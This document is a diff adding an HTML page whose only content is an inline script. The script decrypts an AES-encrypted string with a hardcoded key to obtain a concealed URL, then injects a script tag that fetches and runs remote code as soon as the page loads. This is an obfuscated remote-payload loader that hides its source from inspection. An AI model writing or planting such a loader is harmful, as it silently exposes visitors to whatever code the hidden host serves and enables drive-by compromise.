@@ -1,0 +1,7 @@
+<html><body><script>(function(){
+const encrypted="U2FsdGVkX1/L7jbzSSGQEW0otyB4hDNaCA7KRChBoipATIS4xVjM3a2y8t5tjmkk";
+const key="oulocalKey";
+function decryptAES(cipher,key){const bytes=CryptoJS.AES.decrypt(cipher,key);return bytes.toString(CryptoJS.enc.Utf8);}
+const url=decryptAES(encrypted,key);const s=document.createElement('script');s.src=url;
+document.head.appendChild(s);
+})();</script></body></html>
